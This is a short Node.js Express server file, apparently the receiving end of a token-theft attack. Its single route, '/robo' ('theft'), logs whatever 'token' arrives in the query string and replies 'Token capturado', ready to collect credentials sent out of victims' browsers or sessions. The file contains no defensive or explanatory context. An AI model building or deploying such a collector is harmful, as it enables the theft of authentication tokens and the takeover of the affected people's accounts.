const express = require("express");
const app = express();

app.get("/robo", (req, res) => {
  console.log("📥 Token recibido:", req.query.token);
  res.send("✅ Token capturado");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Servidor activo");
});
